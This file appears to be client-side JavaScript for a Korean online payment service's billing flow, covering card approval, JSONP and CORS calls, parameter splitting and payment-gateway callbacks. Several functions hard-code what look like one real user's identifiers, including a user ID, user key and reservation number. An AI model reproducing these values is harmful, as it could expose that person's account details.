			bill.initOneClickCardInfo = function(callback, ckey){
				bill.commonTransferData(bill.variable._getOneClickCardInfoUrl,$H({rsvseq : '6261708841', chnl : 'NV', userkey : '238621119', 'ckey': ckey, NAMES :"rsvseq, chnl, userkey"})
						, function(result){
						if( result == 'error'){
							alert('카드정보를 불러오는 중에 오류가 발생했습니다.');
							callback(false);
						} else{				
							bill.variable._oneClickCardInfo = result;
							callback(true);
						}			
					})		
			}
			
			bill.oneClickCardSeq = function(cardCd) {
				return $Json(this.variable._oneClickCardInfo).get(cardCd);
			}
			
			bill.findOneClickCardInfo = function(cardCd) {
				for(i = 0;i < bill.variable._oneClickCardInfo.cardList.length; i++) {
					var value = bill.variable._oneClickCardInfo.cardList[i];
					if(value.billingCardCode === cardCd) {
						return value.cid;
					}	
				}	
			}
			
			bill.makeClientseq = function() {
				var tmp_dt = new Date();
				return '' + tmp_dt.getMinutes() + tmp_dt.getSeconds() + tmp_dt.getMilliseconds() + Math.floor(Math.random()*1001);
			};
			
			bill.approval = function(commonFrm, callbackFn, callbackFn2) {
				if( !this.variable._bInit ) {
					this.variable._init();
				}
				var _cmFrm = $Form(commonFrm);
				_cmFrm.value('MSG', '');
				_cmFrm.value('APPROVALSEQ', '');
				_cmFrm.value('ACCTNO', '');
				_cmFrm.value('ENDDATE', '');
				_cmFrm.value('BALANCE', '');
				_cmFrm.value('SPLITPARAM', '');
				_cmFrm.value('SPLITYN', 'N');
				_cmFrm.value('CLIENTSEQ', this.makeClientseq());
				_cmFrm.value('RSVSEQ', '6261708841');
				_cmFrm.value('CHNL', 'NV');
				_cmFrm.value('USERID', 'kikim0090');
				_cmFrm.value('USERKEY', '238621119');
				_cmFrm.value('CPID', '50000097');
				_cmFrm.value('ITEMID', '50003125');
				_cmFrm.value('SID', '15232492367');
				_cmFrm.value('AMT', this.delComma(_cmFrm.value('AMT')));
				if (_cmFrm.value('SURL') == ""){
					_cmFrm.value('SURL', this.variable._mobileSurl);
				} else {
					_cmFrm.value('SURL', _cmFrm.value('SURL'));
				}
				_cmFrm.value('RURL', _cmFrm.value('RURL'));
				_cmFrm.value('CURL', _cmFrm.value('CURL'));
				if (_cmFrm.value('MACRURL') == ""){
					_cmFrm.value('MACRURL', this.variable._macRurl);
				} else {
					_cmFrm.value('MACRURL', _cmFrm.value('MACRURL'));
				}
				_cmFrm.value('USEPENDING', this.variable._usePending);
				
				var pgid = _cmFrm.value('PGID');
				if(!this.variable._formPG.hasKey(pgid) || !this.variable._approvalPG.hasKey(pgid) ){
					_cmFrm.value('MSG', '결제수단 오류입니다.');
					callbackFn(_cmFrm.$value());
					return false;
				}
				var _pgFrm = $Form(bill.variable._formPG.$(pgid));
				$A(_cmFrm.element()).forEach(function(value, index, array) { 
					var el = $Element(value);
					_pgFrm.value(el.attr('name'), el.attr('value'));
				});
				
				//PG call
				var self = this;
				var approvalFn = this.variable._approvalPG.$(pgid);
				setTimeout(function() {
					approvalFn.apply(self, [_cmFrm, _pgFrm, function(pgResult) {
						if (pgResult == 'success') {
							if (_cmFrm.value('LOSTPWCHANGEFG') == "Y") {
								_cmFrm.value('MSG', 'success');
								callbackFn(_cmFrm.$value());
							} else {
								var oAjaxQueue = new $Ajax.Queue({   
									 stopOnFailure : false
								}); 
								self.approvalAjaxCallSplit(oAjaxQueue, _pgFrm, self.variable._maxTxtSize);
								oAjaxQueue.add(self.approvalAjaxCallJsonp(_cmFrm, callbackFn),$S(_pgFrm.serialize()).parseString());
								oAjaxQueue.request();
							}
						} else if ( pgResult == 'installerror'){
							_cmFrm.value('MSG','모듈이 설치되지 않았습니다.');
							callbackFn(_cmFrm.$value());
						} else if (pgResult == 'virnocallerror') {
							_cmFrm.value('MSG','카드간편결제 승인처리가 되지 않았습니다.');
							callbackFn(_cmFrm.$value());
						} else if(pgResult == 'cierror'){
							_cmFrm.value('MSG','해당ID의 CI값을 올바르게 가져오지 못했습니다.');
							callbackFn(_cmFrm.$value());
						} else if(pgResult == 'mobilepreapprovalerror'){
							_cmFrm.value('MSG', _pgFrm.value('MSG'));
							callbackFn(_cmFrm.$value());
						} else if(pgResult == 'nomatcherror'){
							_cmFrm.value('MSG', _pgFrm.value('MSG'));
							callbackFn(_cmFrm.$value());
						} else if(pgResult == 'failmsg') {
							_cmFrm.value('MSG', _pgFrm.value('MSG'));
							callbackFn(_cmFrm.$value());
						} else {
							_cmFrm.value('MSG','결제가 처리되지 않았습니다.');
							callbackFn(_cmFrm.$value());
						}
					}, callbackFn2]);
				},500);
			};
			
			bill.commonTransferDataWithJsonp = function commonTransferDataWithJsonp(url, map, callbackFn){
				  var params = '';
				  var names = map.$('NAMES');
					map.remove('NAMES');
					map.forEach(function printIt(value, key, object) {
						params+=key+'='+value+',';
					});
					params = params.substring(0,params.length-1);
				var oAjax = new $Ajax(url , {
					type : 'jsonp',
					method : 'get',
					async : false,
					onload : function(res) {
						var result = res.json();
						if( result[0].rtncd == '00' ) {
							callbackFn(result[0]);
						} else if(result[0].rtncd == '000'){
							callbackFn(result[0]);
						}else {
							callbackFn("error");
						}
					},
					onerror : function(res) {
						var result = res.json();
						callbackFn("error");
					}
				});
				
				oAjax.request({
					VALUES : params,
					NAMES : names
				});
			}
			
			
			
			bill.commonTransferData = function commonTransferData(url, map, callbackFn){
				 var xhr = bill.createCORSRequest('POST', url); 
				   if (!xhr) {
					bill.commonTransferDataWithJsonp(url, map, callbackFn);
					return;
				  }
				  var params = '';
				  var names = map.$('NAMES');
					map.remove('NAMES');
					map.forEach(function printIt(value, key, object) {
						params+=key+'='+value+',';
					});
					params = params.substring(0,params.length-1);
				 
				  xhr.onload = function() {
					var text = xhr.responseText;
					var parsed = JSON.parse(text);
					if( parsed[0].rtncd == '00' ) {
						callbackFn(parsed[0]);
					}else{
						alert(parsed[0].msg);
						callbackFn('error');
					}
				  };
				  xhr.onerror = function() {
					  callbackFn('error');
				  };
				  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
				  xhr.send('NAMES='+names+'&'+'VALUES='+params);
			}
			
			bill.createCORSRequest = function createCORSRequest(method, url) {
				  var xhr = new XMLHttpRequest();
				  if ("withCredentials" in xhr) {
					xhr.open(method, url, false);
					
				  } else if (typeof XDomainRequest != "undefined") {
					  return null;
				  } else {
					xhr = null;
				  }
				  return xhr;
				}
				
			bill.encryptWithCors = function encryptWithCors(method, pgcp, map, callbackFn) {
				  var url = this.variable._asyncCipherWithCorsUrl;
				  if(method == "dec"){
					  url += "?m=decrypt";
				  }
				  var xhr = this.createCORSRequest('POST', url);
				  if (!xhr) {
						this.encryptWithJsonp(method, pgcp, map, callbackFn);
						return;
				  }
				  var params = '';
				  var names = map.$('NAMES');
					map.remove('NAMES');
					map.forEach(function printIt(value, key, object) {
						params+=key+'='+value+',';
					});
					params = params.substring(0,params.length-1);
				  
				  xhr.onload = function() {
					var text = xhr.responseText;
					var parsed = JSON.parse(text);
					if( parsed[0].rtncd == '00' ) {
						callbackFn(parsed[0]);
					}else{
						callbackFn('error');
					}
				  };
			
				  xhr.onerror = function() {
					  callbackFn('error');
				  };
				  xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
				  xhr.send('NAMES='+names+'&'+'VALUES='+params+'&PGCP='+pgcp);
			}
			
			bill.encryptWithJsonp =  function encryptWithJsonp(method, pgcp, map, callbackFn){
				var params = '';
				var names = map.$('NAMES');
				map.remove('NAMES');
				map.forEach(function printIt(value, key, object) {
					params+=key+'='+value+',';
				});
				params = params.substring(0,params.length-1);
				var url = this.variable._asyncCipherUrl;
				if(method == "dec"){
					  url += "?m=decrypt";
				 }
				var oAjax = new $Ajax(url , {
					type : 'jsonp',
					method : 'get',
					async : false,
					onload : function(res) {
						var result = res.json();
						if( result[0].rtncd == '00' ) {
							callbackFn(result[0]);
						} else {
							callbackFn("error");
						}
					},
					onerror : function(res) {
						var result = res.json();
						callbackFn("error");
					}
				});
				
				oAjax.request({
					PGCP : pgcp,
					VALUES : params,
					NAMES : names
				});
			
			}
			
			
			bill.postApproval = function(commonFrm, callbackFn, callbackFn2) {
				if( !this.variable._bInit ) {
					this.variable._init();
				}
				var _cmFrm = $Form(commonFrm);
				var pgid = _cmFrm.value('PGID');
				
				if(!this.variable._formPG.hasKey(pgid) || !this.variable._approvalPG.hasKey(pgid) ){
					_cmFrm.value('MSG', '결제수단 오류입니다.');
					callbackFn(_cmFrm.$value());
					return false;
				}
				var _pgFrm = $Form(bill.variable._formPG.$(pgid));
				$A(_cmFrm.element()).forEach(function(value, index, array) { 
					var el = $Element(value);
					_pgFrm.value(el.attr('name'), el.attr('value'));
				});
				
				//PG call
				var self = this;
				var postApprovalFn = this.variable._postApprovalPG.$(pgid);
				
				setTimeout(function() {
					postApprovalFn.apply(self, [_cmFrm, _pgFrm, function(pgResult) {
						if (pgResult == 'success') {
							_cmFrm.value('MSG','2차인증 성공');
							self.postApprovalAjaxCallJsonp(_cmFrm, _pgFrm, callbackFn);
						} else if ( pgResult == 'installerror'){
							_cmFrm.value('MSG','모듈이 설치되지 않았습니다.');
							callbackFn(_cmFrm.$value());
						} else if (pgResult == 'virnocallerror') {
							_cmFrm.value('MSG','카드간편결제 승인처리가 되지 않았습니다.');
							callbackFn(_cmFrm.$value());
						} else if(pgResult == 'cierror'){
							_cmFrm.value('MSG','해당ID의 CI값을 올바르게 가져오지 못했습니다.');
							callbackFn(_cmFrm.$value());
						} else if(pgResult == 'mobilepreapprovalerror'){
							_cmFrm.value('MSG', _pgFrm.value('MSG'));
							callbackFn(_cmFrm.$value());
						} else if(pgResult == 'oneclickcreditregerror'){
							_cmFrm.value('MSG', _pgFrm.value('MSG'));
							callbackFn(_cmFrm.$value());
						} else if(pgResult == 'nomatcherror'){
							_cmFrm.value('MSG', _pgFrm.value('MSG'));
							callbackFn(_cmFrm.$value());
						}else {
							_cmFrm.value('MSG','결제가 처리되지 않았습니다.');
							callbackFn(_cmFrm.$value());
						}
					}, callbackFn2]);
				},500);
			};
			
			bill.approvalAjaxCallSplit = function(oAjaxQueue, pgForm, size) {
				var self = this;
				if( size < self.variable._minTxtSize ) {
					return false;
				}
				$A(pgForm.element()).forEach(function(value, index, array) { 
					var el = new $Element(value);
					var val = el.attr('value');
					if( el.attr('name') == 'SPLITPARAM') {
						$A.Continue();   
					}
					if( encodeURIComponent(val).length < size )  { 
						$A.Continue();   
					}
			
					var len = val.length; 
					var arrSize = Math.ceil(len/self.variable._chunkSize);
			
					var strArr = $A();
					var tmpStr = new $S('');
					var tmpLen = 0;
					for( var i = 0; i < arrSize ; i++) {
						var appndStr = val.substr(i*self.variable._chunkSize, self.variable._chunkSize);
						var appndLen = encodeURIComponent(appndStr).length;
						if( tmpLen + appndLen > self.variable._maxTxtSize ) {
								if( tmpLen > 0 ) {
									strArr.push(tmpStr);
								}
								tmpStr = new $S(appndStr);
								tmpLen = appndLen;
						} else {
								tmpStr = tmpStr + appndStr;
								tmpLen = tmpLen + appndLen;
						}
					}
					if( tmpLen > 0 ) {
						strArr.push(tmpStr);
					}
			
					for( var i = 0; i < strArr.length(); i++) {
						var oAjax = new $Ajax(self.variable._preCallUrl, {   
							type : 'jsonp',
							method : 'get',
							async : false,
							onload :  function(res){
								;
							}   
						});
						var prm = new $H();
						prm.add('rsvseq', pgForm.value('RSVSEQ'));
						prm.add('chnl', pgForm.value('CHNL'));
						prm.add('userkey', pgForm.value('USERKEY'));
						prm.add('pgid', pgForm.value('PGID'));
						prm.add('clientseq', pgForm.value('CLIENTSEQ'));
						prm.add('totsize', len);
						prm.add('totcnt', strArr.length());
						prm.add('curcnt', i);
						prm.add('key', el.attr('name'));
						prm.add('val', strArr.get(i));
						oAjaxQueue.add(oAjax, prm.$value());
					}	
					
					el.attr('value', '');
					pgForm.value('SPLITYN', 'Y');
					if (pgForm.value('SPLITPARAM').length > 0) {
						pgForm.value('SPLITPARAM', pgForm.value('SPLITPARAM')+',' );
					}
					pgForm.value('SPLITPARAM', pgForm.value('SPLITPARAM') + el.attr('name'));
				});
				if( pgForm.serialize().length > self.variable._maxTxtSize ) {
					self.approvalAjaxCallSplit(oAjaxQueue, pgForm, Math.ceil(size/2));
				}
			};
			
			bill.approvalAjaxCallJsonp = function(commonFrm, callbackFn) {
				var self = this;
				var oAjax = new $Ajax(self.variable._callUrl, {
					type : 'jsonp',
					method : 'get',
					async : false,
					onload : function(res) {
						var result = res.json();
						self.approvalCallBackSuccess($H(result[0]), commonFrm, callbackFn);			
					},
					onerror : function(res) {
						var result = res.json();
						self.approvalCallBackFail($H(result[0]), commonFrm, callbackFn);
					}
				});
				return oAjax;
			};
			
			bill.approvalCallBackSuccess = function(rtnMap, commonFrm, callbackFn){
				if( rtnMap.$('rtncd') == '00' ) {
					commonFrm.value('MSG',rtnMap.$('msg'));
					commonFrm.value('APPROVALSEQ', rtnMap.$('approvalseq'));			
					// account
					if( rtnMap.hasKey('acctno')) {
						commonFrm.value('CORPCD',rtnMap.$('corpcd'));
						commonFrm.value('ACCTNO',rtnMap.$('acctno'));
						commonFrm.value('ENDDATE',rtnMap.$('enddate'));
					}
					// mobile 
					if(rtnMap.hasKey('balance')) {
						commonFrm.value('BALANCE',rtnMap.$('balance'));
					}
					if(rtnMap.hasKey('authType')) {
						commonFrm.value('AUTHTYPE',rtnMap.$('authType'));
					}
					if(rtnMap.hasKey('ansimFlag')) {
						commonFrm.value('ANSIMFG',rtnMap.$('ansimFlag'));
					}
					if(rtnMap.hasKey('safeguard')) {
						commonFrm.value('SAFEFG',rtnMap.$('safeguard'));
					}
					if(rtnMap.hasKey('authno')) {// moblie
						commonFrm.value('AUTHNO',rtnMap.$('authno'));
					}
					if(rtnMap.hasKey('paykey')) {
						commonFrm.value('PAYKEY',rtnMap.$('paykey'));
					}
				} else {
					commonFrm.value('MSG', rtnMap.$('msg'));
				}
				callbackFn(commonFrm.$value());
			};
			
			bill.npcbCheckStr = function npcbCheckStr(pgcp, common) {
				var npcbStr = {
					pgcp: pgcp,
					pgid : common.value('PGID'),
					corpcd: common.value('CORPCD'),
					NAMES: "pgcp, pgid, corpcd"
				};
			
				return npcbStr;
			};
			
			bill.approvalCallBackFail = function(rtnMap, commonFrm, callbackFn) {
				commonFrm.value('MSG','인증오류 발생 ' + rtnMap.$('msg'));
				callbackFn(commonFrm.$value());
			};
			
			bill.postApprovalAjaxCallJsonp = function(commonFrm, pgFrm, callbackFn) {
				var self = this;
				
				var oAjax = new $Ajax(self.variable._postCallUrl, {
					type : 'jsonp',
					method : 'get',
					async : false,
					onload : function(res) {
						var result = res.json();
						self.postApprovalCallBackSuccess($H(result[0]), commonFrm, callbackFn);			
					},
					onerror : function(res) {
						var result = res.json();
						self.postApprovalCallBackFail($H(result[0]), commonFrm, callbackFn);
					}
				});
				oAjax.request({
					PGCP :  pgFrm.value('PGCP'),
					VALUES : 'APPROVALSEQ='+commonFrm.value('APPROVALSEQ')+',RSVSEQ='+commonFrm.value('RSVSEQ')+',mUserKey='+pgFrm.value('mUserKey'),
					NAMES : 'mUserKey'
				});
			};
			
			bill.postApprovalCallBackSuccess = function(rtnMap, commonFrm, callbackFn){
				if( rtnMap.$('rtncd') == '00' ) {
					commonFrm.value('MSG',rtnMap.$('msg'));
				} else {
					commonFrm.value('MSG', rtnMap.$('msg'));
				}
				callbackFn(commonFrm.$value());
			};
			
			bill.postApprovalCallBackFail = function(rtnMap, commonFrm, callbackFn) {
				commonFrm.value('MSG','2차인증오류 발생 ' + rtnMap.$('msg'));
				callbackFn(commonFrm.$value());
			};
			
			bill.delComma = function(num){
				var parseNum = 0;
				if(isNaN(num)) {
					if(!isNaN(num.replace(/,/gi,''))) {
						parseNum = num.replace(/,/gi,'');
					}
				} else {
					parseNum = num;
				}
				return parseInt(parseNum, 10)
			};
			
			bill.isIE = function() {
				var isIE = $Agent().navigator().ie;
				if (!!navigator.userAgent.match(/Trident.*rv:11\./)) {
					isIE = true;
				}
				return isIE;
			}
			
			bill.isIE11Mode = function() {
				if (document.documentMode >= 11) {
					return true;
				}
				return false;
			}
			
			bill.attachDivision = function(sDomain, sTgt, sId, sInnerHtml) {
				var elDoc = sDomain.document;
				var elDiv = elDoc.getElementById(sId);
				if(elDiv) {
					return false;
				} else {
					var elTgt = elDoc.getElementsByTagName(sTgt)[0];
					elDiv = elDoc.createElement("div");
					elDiv.id = sId;
					elDiv.innerHTML = sInnerHtml;
					elTgt.appendChild(elDiv);
					return true;
				}
			};
			
			bill.lazyLoading = {
				_bIE : $Agent().navigator().ie,
				_waLoading : $A([]),
				_waLoaded : $A([]),
				_whtScript : $H({}),
				_whtCallback : $H({})
			};
			
			bill.lazyLoading.load = function(sDomain, sTgt, sUrl, fCallback, sCharset) {
				var strKey = sDomain.name+":"+sUrl;
				if (typeof fCallback != "function") {
					fCallback = function(){};
				}
				this._queueCallback(strKey, fCallback);
				if (this._checkIsLoading(strKey)) {
					return false;
				}
				if (this._checkAlreadyLoaded(strKey)) {
					return true;
				}
				this._waLoading.push(strKey);
				
				var self = this;
				var elDoc = sDomain.document;
				var elTgt = elDoc.getElementsByTagName(sTgt)[0]; 
				var elScript = elDoc.createElement("script");
				elScript.type = "text/javascript";
				if(sCharset) {
					elScript.charset = sCharset;
				} 
				elScript.src = sUrl;
				this._whtScript.add(strKey, elScript);
				
				if (this._bIE && !bill.isIE11Mode()) {
					elScript.onreadystatechange = function() {
						if(this.readyState == "complete" || this.readyState == "loaded") {
							self._waLoaded.push(strKey);
							self._waLoading = self._waLoading.refuse(strKey);
							self._doCallback(strKey);
							this.onreadystatechange = null;
						}
					};		
				} else {
					elScript.onload = function() {
						self._waLoaded.push(strKey);
						self._waLoading = self._waLoading.refuse(strKey);
						self._doCallback(strKey);
					};
				}
				elTgt.appendChild(elScript);
				return true;
			};
			
			bill.lazyLoading._queueCallback = function(strKey, fCallback) {
				var aCallback = this._whtCallback.$(strKey);
				if (aCallback) {
					aCallback.push(fCallback);
				} else {
					this._whtCallback.$(strKey, [fCallback]);
				}
			};
			
			bill.lazyLoading._doCallback = function(strKey) {
				var aCallback = this._whtCallback.$(strKey).concat();
				for (var i = 0; i < aCallback.length; i++) {
					this._whtCallback.$(strKey).splice(i, 1);
					aCallback[i]();
				}
			};
			
			bill.lazyLoading.abort = function(sDomain, sUrl) {
				var strKey = sDomain.name+":"+sUrl;
				if (this._checkIsLoading(strKey)) {
					var elScript = this.getScriptElement(strKey);
					this._waLoading = this._waLoading.refuse(strKey);
					
					if (this._bIE && !bill.isIE11Mode()) {
						elScript.onreadystatechange = null;	
					} else {
						elScript.onload = null;
					}		
					$Element(elScript).leave();
					this._whtScript.remove(strKey);
					this._whtCallback.remove(strKey);
					return true;
				} else {
					return false;
				}
			};
			
			bill.lazyLoading._checkAlreadyLoaded = function(strKey) {
				return this._waLoaded.has(strKey);
			};
			
			bill.lazyLoading._checkIsLoading = function(strKey) {
				return this._waLoading.has(strKey);
			};
			
			bill.lazyLoading.getLoaded = function() {
				return this._waLoaded.$value();
			};
			
			bill.lazyLoading.getLoading = function() {
				return this._waLoading.$value();
			};
			
			 bill.lazyLoading.getScriptElement = function(strKey) {
				return this._whtScript.$(strKey) || null;
			};
			
			bill.checkMinAmt = function (amt, minamt) {
				if (bill.delComma(amt) < bill.delComma(minamt)) {
					return false;
				}
				return true;
			}
			
			bill.getCookie = function(cookieName) {
				var i, cookieArray = document.cookie.split(";");
				for (i = 0; i < cookieArray.length; i++) {
					var x = cookieArray[i].substr(0, cookieArray[i].indexOf("="));
					var y = cookieArray[i].substr(cookieArray[i].indexOf("=") + 1);
					x = x.split(/^\s+|\s+$/g).join("");
					if (x == cookieName) {
						return unescape(y);
					}
				}
			}
			
			bill.callVirNo = function(cardcd, pgcd, pgid, callbackFn) {
				var self = this;
				var oAjax = new $Ajax(self.variable._virCallUrl, {
					type : 'jsonp',
					method : 'get',
					async : false,
					onload : function(res) {
						var result = res.json();
						
						if( $H(result[0]).$('rtncd') == '00' ) {
							if(!($H(result[0]).hasKey('virtualno'))) {
								callbackFn("error");
							} else {
								callbackFn($H(result[0]).$('virtualno'));
							}
						} else {
							callbackFn("error");
						}			
					},
					onerror : function(res) {
						var result = res.json();
						callbackFn("error");
					}
				});
				oAjax.request({
					CHNL : 'NV',
					USERID : 'kikim0090',
					CARDCD : cardcd,
					PGCD : pgcd,
					PGID : pgid
				});
			}
			
			bill.getOneClickCardPg = function(cardcd, orgvalue, findvalue) {
				var device = this.variable._device;
				if (device == "MOBILE") {
					device = "MOBILE";
				} else {
					device = "PC";
				}
				var id = cardcd + device + "/" + findvalue;
				var newValue = $Json(this.variable._oneClickCardPgInfo).get(id);
				if (newValue == 'undefined' || newValue == '' || newValue == null || newValue == 'null') {
					return orgvalue;
				}
				return newValue;
			}
			
			bill.convertPg = function(pgid, cardcd, instmo, orgvalue, findvalue, amt) {
				var searchPattern = new RegExp('^51', 'i');
				if (searchPattern.test(pgid)) {
					pgid = bill.getOneClickCardPg(cardcd, pgid, 'pgid');
					if ( findvalue.indexOf('pgid') == 0) {
						orgvalue = pgid;
					} else if (findvalue.indexOf('mid') == 0) {
						orgvalue = bill.getOneClickCardPg(cardcd, orgvalue, 'mid');
					} else if (findvalue.indexOf('submid') == 0) {
						orgvalue = bill.getOneClickCardPg(cardcd, orgvalue, 'submid');
					}
				}
				
				var id = pgid + cardcd + instmo + "/" + findvalue;
				var newValue = $Json(this.variable._defermentPayList).get(id);
				
				if (newValue == 'undefined' || newValue == '' || newValue == null || newValue == 'null') {
					return orgvalue;
				}
				
				if (amt == 'undefined' || amt == '' || amt == null || amt == 'null') {
					return newValue;
				}
				
				var minAmtId = pgid + cardcd + instmo + "/minamt";
				var minAmt = $Json(this.variable._defermentPayList).get(minAmtId);
				if (minAmt == 'undefined' || minAmt == '' || minAmt == null || minAmt == 'null') {
					return newValue;
				}
				
				if (typeof amt != "number") {
					amt = amt * 1;
				}
				
				if (amt < minAmt) {
					return orgvalue;	
				}
				
				return newValue;
			}
			
			bill.convertPgId = function(pgid, cardcd, instmo, amt) {
				return bill.convertPg(pgid, cardcd, instmo, pgid, 'pgid', amt);
			}
			
			bill.convertPgMid = function(pgid, cardcd, instmo, mid, amt) {
				return bill.convertPg(pgid, cardcd, instmo, mid, 'mid', amt);
			}
			
			bill.convertPgSubMid = function(pgid, cardcd, instmo, submid, amt) {
				return bill.convertPg(pgid, cardcd, instmo, submid, 'submid', amt);
			}
			
			bill.isDefermentPay = function(orgPgid, cardcd, instmo, amt) {
				var pgid = orgPgid;
				var searchPattern = new RegExp('^51', 'i');
				if (searchPattern.test(orgPgid)) {
					pgid = bill.getOneClickCardPg(cardcd, orgPgid, 'pgid');
				}
				var newValue = bill.convertPg(pgid, cardcd, instmo, pgid, 'pgid', amt);
				if (newValue.toString() == pgid.toString()) {
					return false;
				} else {
					return true;
				}
			}
			
			
			bill.postForm = function (path, params, method, type, frame) {
				method = method || "post";
				var form = document.createElement("form");
				form.setAttribute("method", method);
				form.setAttribute("action", path);
				for(var key in params) {
					var hiddenField = document.createElement("input");
					hiddenField.setAttribute("type", "hidden");
					hiddenField.setAttribute("name", key);
					hiddenField.setAttribute("value", params[key]);
					form.appendChild(hiddenField);
				}
				document.body.appendChild(form);
				if (type == 'P') {
					window.open('', 'ocformpopup', 'width=500,height=680,resizeable,scrollbars,location=no,status=no');
					form.target = 'ocformpopup';
				} else if (type == 'I') {
					form.target = frame;
					adjustIframeScreen('ct', frame);
					$Element(frame).show();
				}
				form.submit();
			}
			function adjustIframeScreen(main, iframe){
				 var width = (window.innerWidth > 0) ? window.innerWidth : screen.width;
				 var height = (window.innerHeight > 0) ? window.innerHeight : screen.height;
				 if(typeof document.getElementById(main) != 'undefined' && document.getElementById(main) != null){
					 $Element(main).hide();
				 }
				 $Element(iframe).css({width: width+"px", height: height+"px"});
			}
			
			bill.getForm = function (path, type, frame) {
				method = "get";	
				var form = document.createElement("form");
				form.setAttribute("method", method);
				if (type == 'P') {
					
					if(navigator.userAgent.match(/Trident\/5.0/i) != null || navigator.userAgent.match(/Trident\/6.0/i) != null || navigator.userAgent.match(/Trident\/7.0/i) != null){
						   var ocWindow = window.open('', 'ocformpopup', 'width=500,height=680,resizeable,scrollbars,location=no,status=no');
							ocWindow.location.href=path;
					}else{
						var referLink = document.createElement('a');
						referLink.href = path;
						referLink.target="ocformpopup";
						referLink.onclick=function(){window.open(path, 'ocformpopup', 'width=500, height=680, resizeable=yes, scrollbars=yes')};
						document.body.appendChild(referLink);
						referLink.click();
					}
			
					
				} else if (type == 'I') {
					form.action = path;
					form.target = frame;
					$Element(frame).show();
					form.submit();
				}
				
			}
			
			bill.getMemberUrl = function () {
				if (bill.variable._device == 'MOBILE') {
					return "http://nid.naver.com/mobile/naverPay.nhn";
				} else {
					return "http://nid.naver.com/user2/naverPay.nhn";
				}
			}
			
			function doPay_Result(X_RESP,X_MSG,VBV_XID,VBV_ECI,VBV_CAVV,VBV_JOINCODE,LGD_PAN,LGD_EXPYEAR,LGD_EXPMON, LGD_SP_AUTHTYPE)
			{
				bill.variable._returnForm.value("VBV_XID", VBV_XID);
				bill.variable._returnForm.value("VBV_ECI", VBV_ECI);
				bill.variable._returnForm.value("VBV_CAVV", VBV_CAVV);
				bill.variable._returnForm.value("LGD_PAN", LGD_PAN);
				bill.variable._returnForm.value("LGD_EXPYEAR", LGD_EXPYEAR);
				bill.variable._returnForm.value("LGD_EXPMON", LGD_EXPMON);
				bill.variable._returnForm.value("LGD_SP_AUTHTYPE", LGD_SP_AUTHTYPE);
				
				if(VBV_JOINCODE != null)
				{
					bill.variable._returnForm.value("VBV_JOINCODE", VBV_JOINCODE);
				}
				bill.variable._lastCallbackFn("success");	
			}
			
			function doPay_Result_ISP(X_RESP,X_MSG,KVP_NOINT,KVP_QUOTA,KVP_CARDCODE,KVP_SESSIONKEY,KVP_ENCDATA, LGD_SP_AUTHTYPE)
			{
				bill.variable._returnForm.value("KVP_NOINT", KVP_NOINT);
				bill.variable._returnForm.value("KVP_QUOTA", KVP_QUOTA);
				bill.variable._returnForm.value("KVP_CARDCODE", KVP_CARDCODE);
				bill.variable._returnForm.value("KVP_SESSIONKEY", KVP_SESSIONKEY);
				bill.variable._returnForm.value("KVP_ENCDATA", KVP_ENCDATA);
				bill.variable._returnForm.value("LGD_SP_AUTHTYPE", LGD_SP_AUTHTYPE);
				bill.variable._lastCallbackFn("success");
			}
			
			function doPay_Resultfail(X_RESP,X_MSG)
			{
			// 실패처리 
				alert(X_MSG+"["+X_RESP+"]");
				bill.variable._lastCallbackFn("fail");
			}
			
			function doPay_mobile_Result(X_RESP,X_MSG,authType,phoneId,Mobilid,ansimFlag,safeGuard,mUserkey,carrier)
			{
				if (bill.variable._returnForm.value("PGCP") == "05B") {
					bill.variable._returnForm.value("data", "");
					bill.variable._returnForm.value("CORPCD", carrier);
				}
				if (bill.variable._returnForm.value("PGCP") == "05A" || bill.variable._returnForm.value("PGCP") == "60A") {
					bill.variable._returnForm.value('Okurl', '');
					bill.variable._returnForm.value('Cryptstring', '');
					bill.variable._returnForm.value('Failurl', '');
					bill.variable._returnForm.value('Prdtprice', '');
					bill.variable._returnForm.value('SocialNo', '');
					bill.variable._returnForm.value("CORPCD", carrier);
				}
				
				if (bill.variable._returnForm.value("PGCP") == "60A" && bill.variable._returnForm.value('MC_JOIN_TYPE') == "A") {
					bill.variable._lastCallbackFn("success");
					return false;
				}
				
				bill.variable._returnForm.value("authType", authType);
				if ((typeof phoneId != "undefined") && phoneId != "") {
					bill.variable._returnForm.value("phoneId", phoneId);
				}
				bill.variable._returnForm.value("Mobilid", Mobilid);
				bill.variable._returnForm.value("ansimFlag", ansimFlag);
				bill.variable._returnForm.value("safeguard", safeGuard);
				bill.variable._returnForm.value("mUserKey", mUserkey);
				bill.variable._lastCallbackFn("success");
			}
			
			function doPay_mobile_Resultfail(X_RESP,X_MSG)
			{
				if (bill.variable._returnForm.value("PGCP") == "05B") {
					bill.variable._returnForm.value("data", "");
				}
				if (bill.variable._returnForm.value("PGCP") == "05A" || bill.variable._returnForm.value("PGCP") == "60A") {
					bill.variable._returnForm.value('Okurl', '');
					bill.variable._returnForm.value('Cryptstring', '');
					bill.variable._returnForm.value('Failurl', '');
					bill.variable._returnForm.value('Prdtprice', '');
					bill.variable._returnForm.value('SocialNo', '');
				}
				bill.variable._returnForm.value("MSG", X_MSG);
				bill.variable._lastCallbackFn("mobilepreapprovalerror");
			}
			
			function doPay_Oneclick_Credit_Result(resultCode, resultMessage, virSeq)
			{
				if (bill.variable._returnForm.value("OC_REGTYPE") == 'I') {
					$Element(bill.variable._returnForm.value("OC_REGFRAME")).hide();
				}
				if ((typeof virSeq != "undefined") && virSeq != "") {
					bill.variable._returnForm.value('AUTHNO', virSeq);
					bill.variable._returnCommonForm.value('AUTHNO', virSeq);
				}
				bill.variable._returnForm.value("MSG", resultMessage);
				bill.variable._lastCallbackFn("success");
			}
			
			function doPay_Oneclick_Credit_ResultFail(resultCode, resultMessage, virSeq)
			{	
				if (bill.variable._returnForm.value("OC_REGTYPE") == 'I') {
					$Element(bill.variable._returnForm.value("OC_REGFRAME")).hide();
				}
				bill.variable._returnForm.value("MSG", resultMessage);
				bill.variable._lastCallbackFn("oneclickcreditregerror");
			}
			
			function doPay_Oneclick_Bank_Result()
			{
				
				//bill.variable._returnForm.value('AUTHNO', virSeq);
				//bill.variable._returnCommonForm.value('AUTHNO', virSeq);
				bill.variable._returnForm.value("MSG", 'success');
				bill.variable._lastCallbackFn("success");
			}
			
			function doPay_Oneclick_Bank_ResultFail()
			{	
				
				bill.variable._returnForm.value("MSG", 'fail');
				bill.variable._lastCallbackFn("oneclickcreditregerror");
			}
			
